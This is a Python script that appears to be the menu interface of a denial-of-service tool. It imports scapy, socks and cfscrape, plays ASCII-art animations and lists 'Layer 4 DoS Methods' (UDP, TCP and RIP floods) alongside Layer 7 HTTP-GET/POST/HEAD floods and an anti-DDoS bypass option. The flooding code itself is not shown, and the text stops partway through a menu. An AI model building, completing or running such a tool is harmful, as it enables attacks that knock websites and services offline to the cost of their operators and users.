import socks
import socket
import random
from scapy.all import *
import socks
import os
import json
import time
import cfscrape
import datetime
import requests
import ssl
import pytz



dt_mtn = datetime.datetime.now()

mtn_tz = pytz.timezone('US/Mountain')
dt_mtn = mtn_tz.localize(dt_mtn)

# print(dt_mtn)

dt_east = dt_mtn.astimezone(pytz.timezone('US/Eastern'))
# print(dt_east)




today = dt_mtn.strftime('%B %d, %Y')

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def sus_anim():
    clear()
    print(f'''
                        ⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
                        ⬛⬛🔴🔴🔴🔴⬛   ⬛⬛  ⬛          ⬛⬛
                        ⬛⬛🔴⬛⬛⬛⬛   ⬛⬛  ⬛   ⬛⬛⬛⬛⬛
                        ⬛⬛🔴🔴🔴🔴⬛   ⬛⬛  ⬛          ⬛⬛
                        ⬛⬛⬛⬛⬛🔴⬛   ⬛⬛  ⬛⬛⬛⬛   ⬛⬛
                        ⬛⬛🔴🔴🔴🔴⬛⬛     ⬛⬛          ⬛⬛
                        ⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
    ''')
    time.sleep(0.7)
    clear()
    print(f'''
                        ⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
                        ⬛⬛🔴🔴🔴🔴⬛🔴⬛⬛🔴⬛          ⬛⬛
                        ⬛⬛🔴⬛⬛⬛⬛🔴⬛⬛🔴⬛   ⬛⬛⬛⬛⬛
                        ⬛⬛🔴🔴🔴🔴⬛🔴⬛⬛🔴⬛          ⬛⬛
                        ⬛⬛⬛⬛⬛🔴⬛🔴⬛⬛🔴⬛⬛⬛⬛   ⬛⬛
                        ⬛⬛🔴🔴🔴🔴⬛⬛🔴🔴⬛⬛          ⬛⬛
                        ⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
    ''')
    time.sleep(1)
    clear()
    print(f'''
                        ⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
                        ⬛⬛🔴🔴🔴🔴⬛🔴⬛⬛🔴⬛🔴🔴🔴🔴⬛⬛
                        ⬛⬛🔴⬛⬛⬛⬛🔴⬛⬛🔴⬛🔴⬛⬛⬛⬛⬛
                        ⬛⬛🔴🔴🔴🔴⬛🔴⬛⬛🔴⬛🔴🔴🔴🔴⬛⬛
                        ⬛⬛⬛⬛⬛🔴⬛🔴⬛⬛🔴⬛⬛⬛⬛🔴⬛⬛
                        ⬛⬛🔴🔴🔴🔴⬛⬛🔴🔴⬛⬛🔴🔴🔴🔴⬛⬛
                        ⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
    ''')
    time.sleep(1)
    clear()
    print(f'''
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠯⠀⡖⠒⠒⠠⠤⣄⡀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣷⣶⡆⣶⣶⣿⡏⣦⢁⣄⢿⣿⢰⣶⣶⡌⣿⡏⢰⣶⣦⡄⢠⠇⠀⠀⠀⠀⠀⠈⠑⢳⣦⣽⣿⢱⣶⣶⡌⣿⡇⢰⣶⣶⠈⣿⣿⣿
⣿⣿⣿⣿⡇⣿⣿⣿⠀⣿⢸⣿⢸⣿⠸⠿⠿⢃⣿⡇⢸⣿⣇⠂⠈⠑⠒⠦⠤⣀⡀⠀⠀⢸⣿⣿⣿⢸⣿⣿⡇⣿⡇⠈⢩⣭⣼⣿⣿⣿
⣿⣿⣟⣛⣃⣛⠛⣿⣅⣿⢸⣿⢸⣿⢸⣿⣿⣿⣿⣧⡘⣛⠀⠄⠀⠀⠀⠀⠀⠀⠉⢀⣶⣸⣿⣿⣿⣜⣛⣛⣡⣿⣇⣸⣷⣍⡻⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠁⠱⣤⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣻⠟⢁⡇⠂⠀⠀⢻⣷⣤⣄⣀⣀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⡟⠀⣠⢧⠀⢐⡀⠀⡿⣿⣿⣿⡿⠃⣟⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠟⠛⢉⡍⠀⠈⣽⣿⣿⣿⠒⠛⠉⠀⢳⢼⡇⠀⣇⣈⡍⢉⣄⢼⣥⡀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠈⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⠉⠳⠿⠿⠒⠋⠁⠀⠉⠉⠉⣿⣿⣿⡛⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⣨⣤⣄⡠⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⠀⢈⠉⠛⠃⠀⠀⠙⡀⠉⠻⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠁⠀⠀⠀⢀⣶⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢄⣀⣀⡀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿
⣿⣿⡿⡟⣀⠀⠀⠀⣾⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣷⣦⣀⠀⠀⠀⠀⢹⣿⣿⣿⣿
⣿⣿⢽⠃⠀⠓⠄⣰⣿⡍⢿⣿⣿⣦⣄⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣝⢿⣆⠀⠀⠀⣿⣿⣿⣿⣿
⣿⡿⢼⠀⡄⠀⢀⣿⠿⡃⠀⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⣀⣀⣀⣴⠳⣄⡀⠀⠀⠀⣀⣠⣶⣶⣾⣿⣿⣿⠛⠻⡻⣄⠀⢸⡉⢻⣿⣿⣿
⣿⣇⢸⡆⠇⠀⡞⠁⡕⠀⠀⠸⣿⣿⣿⣿⣿⡿⢿⡿⠛⠉⠉⠁⠈⣶⠉⠛⠛⠲⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠘⢜⡢⠀⠛⢸⣿⣿⣿
⣿⣿⠸⠇⠀⡄⠀⠘⠅⠀⠀⠀⠹⣿⣿⠿⣿⣄⣠⣤⡄⠀⠐⠛⠛⣿⣟⠓⠀⠀⡀⣤⣼⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⡱⠀⠀⢺⣿⣿⣿
⣿⣿⡆⠀⠀⠙⣄⡎⠀⠀⠀⠀⣰⣿⡻⠀⠀⢹⡟⠁⠀⠀⠀⠀⣰⣿⡇⠀⠀⠀⠀⣿⡟⢡⢿⣿⣿⡇⠀⠀⠀⠀⠀⢱⡀⠀⠀⢻⣿⣿
⣿⣿⡄⠀⠀⠀⠀⠻⣿⣶⣤⣤⡙⢿⣧⠐⠦⣬⣄⣀⡀⠠⠶⠒⠛⣿⠟⠁⠀⠰⢦⣿⠗⠃⣰⣿⣿⣧⠀⠀⠀⠀⠀⠘⡤⠀⠀⠀⣿⣿
⣿⣿⣿⣆⠀⠀⠀⠀⠙⡿⢿⣿⣿⡌⠏⣷⣤⣨⣿⠉⠀⠀⠀⠀⠀⢹⡀⠀⠀⠀⠀⣿⣧⣾⠃⣿⣿⣿⣧⡀⣠⣼⣿⡿⠁⠀⠀⢀⣿⣿
⣿⡏⣿⣿⣧⠀⠀⠀⠀⠀⢸⣿⣿⣿⣞⠐⠈⠻⣿⣿⣤⣀⠤⠤⠤⢿⠿⠆⠠⠶⢶⣿⡟⠀⢰⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⢠⣾⣿⣿
⣿⡇⣿⣯⠿⣇⠀⠀⠀⠀⢸⣿⣿⣿⣯⣯⡀⠀⠸⣿⡍⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⠇⠀⢸⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⢰⣿⣿⡿⣿
⣿⣧⣿⡿⡇⠙⢄⠀⠀⠀⢸⣿⣿⣿⣿⡞⣷⡀⠀⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⣼⣿⣿⣿⣿⣿⣿⣟⠄⠀⠀⣼⠟⠘⢰⣿
⣿⣿⣾⣷⠀⠀⠀⠱⣄⡈⢸⣿⣿⣿⣿⣿⠿⠿⣦⡈⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠀⣼⠟⠿⣿⣿⣿⣿⣿⡇⢐⠀⡰⠁⠀⠀⣼⣿
⣿⣿⣿⣿⣧⠀⠀⠀⠹⡇⠸⣿⣿⣿⣿⠏⠀⠀⠈⣷⢻⣷⡀⠀⠀⠀⠀⠀⠀⠀⢀⡟⠀⡏⠀⠀⠘⢿⣿⣿⣿⣷⢸⡼⠁⠀⠀⣠⣿⣿
⣿⣿⣿⣷⣻⣷⣀⣀⣀⣃⣀⣿⣿⣿⣿⣃⣴⣎⣀⣙⣄⣻⣿⣄⣀⣀⣀⣀⣰⠄⣺⣁⣸⣇⣀⣰⣶⣈⣿⣿⣿⣿⣹⣇⣀⣀⣰⣿⣿⣿
    ''')
    time.sleep(2)

def china():
    clear()
    print(f'''
 ╦
 ║
╚╝
    ''')
    time.sleep(0.5)
    clear()
    print(f'''
 ╦╦ ╦
 ║╠═╣
╚╝╩ ╩
    ''')
    time.sleep(0.5)
    clear()
    print(f'''
 ╦╦ ╦╔═╗
 ║╠═╣║ ║
╚╝╩ ╩╚═╝
    ''')
    time.sleep(0.5)
    clear()
    print(f'''
 ╦╦ ╦╔═╗╔╗╔
 ║╠═╣║ ║║║║
╚╝╩ ╩╚═╝╝╚╝
    ''')
    time.sleep(0.5)
    clear()
    print(f'''
⣿⣿⣿⣿⣿⣿⡿⠛⠋⠉⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡿⠋⠁⠄⠄⢠⣴⣶⣿⣿⣶⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠿⣿⣿⣿⣿
⣿⣿⡟⠁⠄⠄⠄⠄⣿⣿⣿⣿⣿⣿⣇⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢹⣿⣿⣿
⣿⣿⣧⠄⠄⠄⠄⢰⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣸⣿⣿⣿
⣿⣿⣿⣧⡀⠄⠄⢸⣿⣿⣿⣿⣿⣿⣿⣷⣆⠄⠄⠄⠄⠄⠄⠄⠄⣰⣿⣿⣿⣿
⣿⣿⣿⣿⡿⣦⣀⣾⣿⣟⣉⠉⠙⢛⡏⠁⠄⠄⠄⠄⠄⠄⠄⠄⠚⢿⣿⣿⣿⣿
⣿⣿⣿⣿⣯⣗⣻⣿⣯⣥⣦⠄⣀⣾⡇⠄⠄⠂⠄⠄⠄⠄⠄⠄⠄⣼⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⠂⠄⠄⠄⠄⠄⠄⠄⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣻⠋⠄⠄⠄⠄⠄⠄⠄⢀⠄⣸⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⡀⠄⠄⠄⠄⠄⠄⢸⣾⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣥⣾⣷⠶⠆⠄⠄⠄⢀⠄⠄⠄⠸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣶⣄⡀⠄⠄⠄⠄⠄⢀⠄⠸⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠟⠚⣿⣿⡻⠿⠿⠛⠙⠁⠄⠄⠄⠄⠠⠂⠄⠄⠘⠿⣿⣿⣿⣿
⠿⠛⠉⠁⠁⠄⠄⠄⣻⣿⣿⣧⣠⣀⠄⠄⠄⠄⡀⠂⠄⠄⠄⠄⠄⠄⠈⠉⠿⢿
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⠿⣿⡿⠃⢀⡠⠄⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
    ''')
    print(f'''
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⡏⠁⠘⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡏⠀⢿⣿⣿⣿⣿⣿⣶⣦⣼⣿⠻⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣟⡉⠉⠉⠁⠀⠈⠉⠉⢉⣿⣿⣿⣿⣿⣏⡀⢀⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡏⠀⣠⣤⡀⠈⣿⣿⣿⣿⣿⣿⣿⡟⠋⠙⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣠⣄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠁⢘⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣧⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ''')
    time.sleep(3)

def zamn():
    clear()
    print(f'''
    ⣿⣿⣿⠻⣿⣿⣯⣉⠉⠉⠉⠀⢀⣠⣶⣶⣶⢶⣲⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⢰
    ⣿⣿⡏⠀⣿⣿⡇⠀⠀⠀⣠⣶⣿⣿⡿⠿⠾⠿⠿⢿⣿⣶⡀⠀⠀⠀⠀⠀⠀⢈
    ⣏⠉⠀⠀⣿⡟⠀⠀⢀⣾⣷⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⠀⠀⠀⠀⠀⠀⠘
    ⡇⠀⠀⠀⣿⡆⠀⠀⣼⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣼⡄⠀⠀⠀⠀⠀⠀
    ⠇⠀⠀⠀⠈⠀⠀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠨⣷⠀⠀⠀⠀⠀⠀
    ⠃⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⠀⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠀⢛⣀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⣀⠺⠏⠀⠀⠀⢁⠀⣀⠉⡣⣤⠤⢤⣶⠔⡋⢉⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⢀⠄⢃⣄⠀⠀⠐⠁⣀⣘⠽⠁⠀⠸⡗⡁⠛⡽⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠄⠄⠈⣃⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠘⢮⠉⠙⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠠⠄⡠⠀⠀⠀⠀⠀⣀⠎⠐⠦⣀⣀⣤⣴⣆⣤⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⢀⣤⣶⠏⡆⣿⣄⠀⠀⠀⣾⠏⠀⠀⠀⠀⠈⠩⢼⣿⠇⠀⠀⠀⠀⠀
    ⣀⣠⣴⣾⣿⣿⣿⠁⠆⢻⣿⣄⡀⢰⡿⣡⣦⣉⣉⠉⢉⣹⣿⠏⠀⠀⠀⠀⠀⠀
    ⣿⣿⣿⣿⣿⣿⡏⢀⠀⠀⠻⣿⣟⢿⡏⠏⠈⠉⠉⠉⠘⢸⣳⣿⣷⣄⠀⠀⠀⠀
    ⣿⡟⢻⣿⣻⣿⡇⢘⡀⠀⠘⣿⡇⠘⠀⠀⠀⠀⠀⠀⠀⠰⣿⣿⣿⣿⣿⣦⡀⠀
    ⣿⡅⢸⣿⡿⣟⣥⠀⢷⣤⣴⣿⣿⣆⠀⠰⡆⠀⢀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⡇
    ⣿⡇⣸⡥⡇⣿⣿⣷⡈⠻⣿⣿⣿⣿⣦⣤⣶⣀⣀⡠⠈⣱⣿⣿⣿⣿⣿⣿⣿⡇
    ⣻⡇⣿⣿⡇⣿⢏⣻⣿⣦⡠⠙⠿⢿⣿⣿⠿⠟⣉⣪⣾⣿⣿⣿⣿⣿⣿⣿⣿⡏
    ⣿⠃⣿⣿⣿⣿⠉⢿⣿⣿⣿⣷⣦⣤⣤⡰⠷⢶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣇
    ⣿⢸⣿⣿⡇⣿⣾⣿⣿⣿⠟⠉⡿⣏⠏⠁⢠⣜⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⡇
    ⣿⣿⣿⣿⢧⣿⣿⣿⣛⣚⣒⣀⣧⣿⠀⠀⠘⣧⠾⠶⠶⠶⠾⣿⣿⣿⣿⣿⣿⣏
    ⣿⣿⡿⡟⠛⠛⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡗
    ⣿⣇⣿⠀⠀⣀⡀⠀⣠⠀⢠⡀⣠⠀⣄⠀⣆⠀⣄⡢⠐⣴⠆⠀⣿⣿⣿⣿⣿⡷
    ⣿⣷⢻⠀⠀⣀⠉⢸⠒⢣⢸⠈⠈⡆⠇⠑⠻⠀⠀⢤⣤⠄⠀⠀⢿⣿⣿⣿⣿⡷
    ⣾⣿⢸⠀⠀⠉⠉⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣰⣾⣿⣿⣿⣯⡗
    ⣿⣿⣾⣐⢠⣤⣤⠤⠤⠶⠶⣶⣖⣒⣚⣛⣻⣿⣿⣭⣭⣭⣽⣿⣿⣿⣿⣿⣿⡟
    ⣿⣿⣿⣿⣾⣿⣛⣋⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣟
    ''')
    time.sleep(2)

def rocket():
    print(f'''
    
''')


def tools():
    sus_anim()
    clear()
    print(f'''
                          ▄▄▄▄▄            ▄▄▌  .▄▄ · 
                          •██  ▪     ▪     ██•  ▐█ ▀. 
                           ▐█.▪ ▄█▀▄  ▄█▀▄ ██▪  ▄▀▀▀█▄
                           ▐█▌·▐█▌.▐▌▐█▌.▐▌▐█▌▐▌▐█▄▪▐█
                           ▀▀▀  ▀█▄▀▪ ▀█▄▀▪.▀▀▀  ▀▀▀▀ 
           \x1b[38;2;132;231;218m╠═══════════════╦═══════════════════════════════════════╣
           \x1b[38;2;132;231;218m║    \x1b[38;2;255;255;255mlookup \x1b[38;2;132;231;218m    ║ \x1b[38;2;255;255;255mSimple IP Address Lookup              \x1b[38;2;132;231;218m║
           \x1b[38;2;132;231;218m║    \x1b[38;2;255;255;255mstatus \x1b[38;2;132;231;218m    ║ \x1b[38;2;255;255;255mSee the website status code           \x1b[38;2;132;231;218m║
           \x1b[38;2;132;231;218m╠═══════════════╩═══════════════════════════════════════╣                    
    ''')

def layer4():
    zamn()
    clear()
    print(f'''   
                            \x1b[38;2;3;63;125m╦  ╔═╗╦ ╦\x1b[38;2;42;162;189m╔═╗╦═╗ ╦ ╦ 
                            \x1b[38;2;3;63;125m║  ╠═╣╚╦╝\x1b[38;2;42;162;189m║╣ ╠╦╝ ╚═╬
                            \x1b[38;2;3;63;125m╩═╝╩ ╩ ╩ \x1b[38;2;42;162;189m╚═╝╩╚═   ╩
                           \x1b[38;2;3;63;125m Layer 4 D\x1b[38;2;42;162;189moS Methods
           \x1b[38;2;132;231;218m╠═══════════════╦═══════════════════════════════════════╣
           \x1b[38;2;132;231;218m║    \x1b[38;2;255;255;255mudp        \x1b[38;2;132;231;218m║  \x1b[38;2;255;255;255mSend many TCP packets per second     \x1b[38;2;132;231;218m║
           \x1b[38;2;132;231;218m║    \x1b[38;2;255;255;255mtcp        \x1b[38;2;132;231;218m║  \x1b[38;2;255;255;255mSend many UDP packets per second     \x1b[38;2;132;231;218m║
           \x1b[38;2;132;231;218m║    r\x1b[38;2;255;255;255mip        \x1b[38;2;132;231;218m║  \x1b[38;2;255;255;255mSend many RIP Payloads per second    \x1b[38;2;132;231;218m║
           \x1b[38;2;132;231;218m╠═══════════════╩═══════════════════════════════════════╣
    ''')

def layer7():
    sus_anim()
    clear()
    print(f'''                            \x1b[38;2;132;231;218m╔══════════════════════════════════════════╗
                            \x1b[38;2;132;231;218m║   \x1b[38;2;3;63;125m▄▄▌   ▄▄▄·  ▄· ▄▌\x1b[38;2;42;162;189m▄▄▄ .▄▄▄     ▄▄▄▄▄    \x1b[38;2;132;231;218m║
                            \x1b[38;2;132;231;218m║   \x1b[38;2;3;63;125m██•  ▐█ ▀█ ▐█▪██▌\x1b[38;2;42;162;189m▀▄.▀·▀▄ █·       █    \x1b[38;2;132;231;218m║
                            \x1b[38;2;132;231;218m║   \x1b[38;2;3;63;125m██▪  ▄█▀▀█ ▐█▌▐█▪\x1b[38;2;42;162;189m▐▀▀▪▄▐▀▀▄       █     \x1b[38;2;132;231;218m║
                            \x1b[38;2;132;231;218m║   \x1b[38;2;3;63;125m▐█▌▐▌▐█ ▪▐▌ ▐█▀·.\x1b[38;2;42;162;189m▐█▄▄▌▐█•█▌     █      \x1b[38;2;132;231;218m║
                            \x1b[38;2;132;231;218m║   \x1b[38;2;3;63;125m.▀▀▀  ▀  ▀   ▀ • \x1b[38;2;42;162;189m ▀▀▀ .▀  ▀    ▀       \x1b[38;2;132;231;218m║
                            \x1b[38;2;132;231;218m╚═══════════════════╦═╦════════════════════╝
                                                \x1b[38;2;132;231;218m║ ║
                      \x1b[38;2;132;231;218m╔═════════════════════╦═══╝ ╚═════════════════════════╗
                      \x1b[38;2;132;231;218m║       \x1b[38;2;255;255;255mmh-get        \x1b[38;2;132;231;218m║    \x1b[38;2;255;255;255mStrong HTTP-GET Attack     \x1b[38;2;132;231;218m║ 
                      \x1b[38;2;132;231;218m║       \x1b[38;2;255;255;255mmh-post       \x1b[38;2;132;231;218m║    \x1b[38;2;255;255;255mStrong HTTP-POST Attack    \x1b[38;2;132;231;218m║
                      \x1b[38;2;132;231;218m║       \x1b[38;2;255;255;255mmh-head       \x1b[38;2;132;231;218m║    \x1b[38;2;255;255;255mStrong HTTP-HEAD Attack    \x1b[38;2;132;231;218m║
                      \x1b[38;2;132;231;218m║       \x1b[38;2;255;255;255mmh-bypass     \x1b[38;2;132;231;218m║  \x1b[38;2;255;255;255mBypass Simple Anti-DDoS Webs \x1b[38;2;132;231;218m║
                      \x1b[38;2;132;231;218m║       \x1b[38;2;255;255;255mhttp-raw      \x1b[38;2;132;231;218m║  \x1b[38;2;255;255;255mSend 1 very powerful package \x1b[38;2;132;231;218m║
                      \x1b[38;2;132;231;218m╚═════════════════════╩═══════════════════════════════╝
    ''')


def best():
    china()
    clear()
    print(f'''
                           ▄▄▄▄· ▄▄▄ ..▄▄ · ▄▄▄▄▄
                           ▐█ ▀█▪▀▄.▀·▐█ ▀. •██  
                           ▐█▀▀█▄▐▀▀▪▄▄▀▀▀█▄ ▐█.▪
                           ██▄▪▐█▐█▄▄▌▐█▄▪▐█ ▐█▌·
                           ·▀▀▀▀  ▀▀▀  ▀▀▀▀  ▀▀▀ 
           \x1b[38;2;132;231;218m╠═══════════════╦═══════════════════════════════════════╣
